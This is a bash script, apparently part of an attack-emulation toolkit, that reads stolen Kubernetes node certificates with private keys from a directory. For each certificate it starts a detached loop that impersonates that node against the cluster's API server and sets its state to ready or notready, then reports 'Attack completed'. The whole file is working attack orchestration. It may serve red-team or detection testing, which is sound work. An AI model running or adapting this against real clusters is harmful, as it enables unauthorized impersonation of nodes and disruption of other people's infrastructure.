#!/usr/bin/env bash
set -euo pipefail

API_SERVER="https://${CONTROL_PLANE_NODE}:${CONTROL_PLANE_PORT}"
MODE="${MODE:-ready}"                    # ready | notready
BASE="${DATA_PATH}/KC5"
CERT_DIR="${BASE}/cert_node"
LOG_DIR="${BASE}/logs"
PID_LIST="${BASE}/pids"
API_LOOP="${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/api-loop.sh"

mkdir -p "$LOG_DIR"
: > "$PID_LIST"

if [[ ! -x "$API_LOOP" ]]; then
  echo "Missing or not executable api-loop.sh: $API_LOOP" >&2
  exit 1
fi

node_from_pem() {
  openssl x509 -in "$1" -noout -subject 2>/dev/null \
    | sed -n 's/^subject=.*CN *= *system:node:\([^,/]*\).*/\1/p' \
    | head -n1
}

pem_has_private_key() {
  grep -q "BEGIN .*PRIVATE KEY" "$1"
}

found=0
started=0

for pem in "$CERT_DIR"/*.pem; do
  [[ -f "$pem" ]] || continue
  found=$((found + 1))

  NODE="$(node_from_pem "$pem")"

  if [[ -z "$NODE" ]]; then
    echo "SKIP $pem: CN is not system:node:*" >&2
    continue
  fi

  if ! pem_has_private_key "$pem"; then
    echo "SKIP $pem: certificate file does not contain a private key" >&2
    continue
  fi

  LOG_FILE="$LOG_DIR/state-update-${NODE}.log"

  echo "Run state updater for node=$NODE cert=$pem mode=$MODE"

  setsid env \
    API_SERVER="$API_SERVER" \
    CERT_PATH="$pem" \
    MODE="$MODE" \
    SLEEP_SECS="${SLEEP_SECS:-1}" \
    FORCE_CS="${FORCE_CS:-true}" \
    "$API_LOOP" \
      >"$LOG_FILE" 2>&1 < /dev/null &

  pid=$!
  echo "$pid" >> "$PID_LIST"
  started=$((started + 1))

  echo "Started updater PID=$pid for node=$NODE"
done

if [[ "$found" -eq 0 ]]; then
  echo "No PEM certificates found in $CERT_DIR" >&2
  exit 1
fi

if [[ "$started" -eq 0 ]]; then
  echo "No state updater loop started" >&2
  exit 1
fi

sleep 3

alive=0

while read -r pid; do
  [[ -z "$pid" ]] && continue

  if kill -0 "$pid" >/dev/null 2>&1; then
    alive=$((alive + 1))
  else
    echo "Updater PID=$pid died early" >&2
  fi
done < "$PID_LIST"

if [[ "$alive" -eq 0 ]]; then
  echo "All state updater loops died early" >&2
  echo "Logs are in $LOG_DIR" >&2
  find "$LOG_DIR" -type f -maxdepth 1 -name 'state-update-*.log' -print -exec tail -n 80 {} \; >&2
  exit 1
fi

echo "Started $alive state updater loop(s)"
echo "PIDs in $PID_LIST"
echo "Logs in $LOG_DIR/state-update-*.log"
echo "Attack completed"